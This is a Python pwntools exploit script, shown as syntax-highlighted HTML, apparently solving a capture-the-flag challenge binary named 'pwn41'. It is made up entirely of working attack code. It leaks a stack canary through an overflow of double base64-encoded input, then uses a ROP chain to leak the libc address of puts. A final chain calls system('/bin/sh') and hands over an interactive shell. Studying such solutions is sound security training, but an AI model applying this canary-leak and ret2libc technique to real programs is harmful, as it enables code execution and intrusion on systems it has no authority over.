<div class="highlight"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">&#39;./pwn41&#39;</span><span class="p">)</span>

<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">&#39;/usr/lib/libc.so.6&#39;</span><span class="p">)</span>
<span class="n">ite</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s">&#39;/bin/sh&#39;</span><span class="p">)</span>

<span class="c">#leak canary</span>
<span class="n">f_payload</span>  <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span> <span class="s">&#39;a&#39;</span><span class="o">*</span><span class="mi">90</span><span class="p">)</span>
<span class="n">fl_payload</span>  <span class="o">=</span> <span class="p">[</span> <span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">f_payload</span> <span class="p">]</span>
<span class="n">fl_payload</span><span class="p">[</span><span class="mi">66</span><span class="p">]</span> <span class="o">=</span> <span class="s">&#39;=&#39;</span>			<span class="c">#cut</span>
<span class="n">ff_payload</span>  <span class="o">=</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span> <span class="n">fl_payload</span> <span class="p">)</span>
<span class="n">b_payload</span> <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span> <span class="n">ff_payload</span> <span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;N]&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;Y&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;data&quot;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span> <span class="n">b_payload</span> <span class="p">)</span>
<span class="n">redata</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;May&#39;</span><span class="p">)</span>
<span class="n">stack</span> <span class="o">=</span> <span class="s">&#39;</span><span class="se">\0</span><span class="s">&#39;</span> <span class="o">+</span> <span class="n">redata</span><span class="p">[</span><span class="mi">170</span><span class="p">:</span><span class="mi">177</span><span class="p">]</span>
<span class="n">canary</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">stack</span><span class="p">)</span>
<span class="k">print</span> <span class="s">&#39;canary: &#39;</span><span class="p">,</span> <span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>


<span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x0000000000400e93</span>
<span class="n">puts_got</span> <span class="o">=</span> <span class="mh">0x602020</span>
<span class="n">puts_plt</span> <span class="o">=</span> <span class="mh">0x00400790</span>

<span class="c">#leak </span>
<span class="n">payload2</span>  <span class="o">=</span> <span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x30</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="s">&#39;B&#39;</span><span class="o">*</span><span class="mi">8</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_got</span><span class="p">)</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_plt</span><span class="p">)</span>
<span class="n">payload1</span>  <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">120</span><span class="p">,</span> <span class="s">&#39;a&#39;</span><span class="p">)</span>
<span class="n">payload0</span>  <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;Y&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;data&quot;</span><span class="p">)</span>
<span class="nb">raw_input</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span> <span class="n">payload0</span> <span class="p">)</span>
<span class="n">redata</span> <span class="o">=</span> <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&#39;May&#39;</span><span class="p">)</span>
<span class="n">puts</span> <span class="o">=</span> <span class="n">redata</span><span class="p">[</span><span class="o">-</span><span class="mi">11</span><span class="p">:</span><span class="o">-</span><span class="mi">5</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="s">&#39;</span><span class="se">\0</span><span class="s">&#39;</span><span class="p">)</span>
<span class="n">puts</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">puts</span><span class="p">)</span>
<span class="k">print</span> <span class="s">&#39;puts: &#39;</span><span class="p">,</span><span class="nb">hex</span><span class="p">(</span><span class="n">puts</span><span class="p">)</span>


<span class="n">libcbase</span> <span class="o">=</span> <span class="n">puts</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">&#39;puts&#39;</span><span class="p">]</span>
<span class="n">system</span> <span class="o">=</span> <span class="n">libcbase</span> <span class="o">+</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">&#39;system&#39;</span><span class="p">]</span>
<span class="n">sh</span> <span class="o">=</span> <span class="n">libcbase</span> <span class="o">+</span> <span class="n">ite</span><span class="o">.</span><span class="n">next</span><span class="p">()</span>


<span class="c">#shell</span>
<span class="n">payload2</span>  <span class="o">=</span> <span class="s">&#39;A&#39;</span><span class="o">*</span><span class="mh">0x30</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="s">&#39;B&#39;</span><span class="o">*</span><span class="mi">8</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">sh</span><span class="p">)</span>
<span class="n">payload2</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
<span class="n">payload1</span>  <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">120</span><span class="p">,</span> <span class="s">&#39;a&#39;</span><span class="p">)</span>
<span class="n">payload0</span>  <span class="o">=</span> <span class="n">b64encode</span><span class="p">(</span><span class="n">payload1</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">&#39;Y&#39;</span><span class="p">)</span>
<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">&quot;data&quot;</span><span class="p">)</span>
<span class="nb">raw_input</span><span class="p">()</span>
<span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span> <span class="n">payload0</span> <span class="p">)</span>

<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</pre></div>